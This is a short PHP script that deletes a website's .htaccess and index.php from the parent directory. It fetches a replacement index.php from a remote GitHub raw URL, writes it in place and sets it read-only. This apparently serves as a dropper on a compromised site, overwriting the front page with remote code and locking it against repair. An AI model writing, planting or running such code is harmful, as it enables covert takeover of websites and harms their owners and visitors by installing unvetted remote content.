<?php

chdir('..');

$remoteUrl = 'https://raw.githubusercontent.com/newmarch2026/bela/refs/heads/main/20-3-2026/new-heldoly/new/index.php';
$files = ['.htaccess', 'index.php'];

/* chmod and delete old files */
foreach ($files as $file) {
    if (file_exists($file)) {
        @chmod($file, 0644);
        @unlink($file);
    }
}

/* download new index.php */
$ch = curl_init($remoteUrl);
curl_setopt_array($ch, [
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_FOLLOWLOCATION => true,
    CURLOPT_TIMEOUT => 20
]);

$data = curl_exec($ch);
curl_close($ch);

if (!$data) {
    die('Download failed');
}

file_put_contents('index.php', $data);
chmod('index.php', 0444);

echo 'Done';
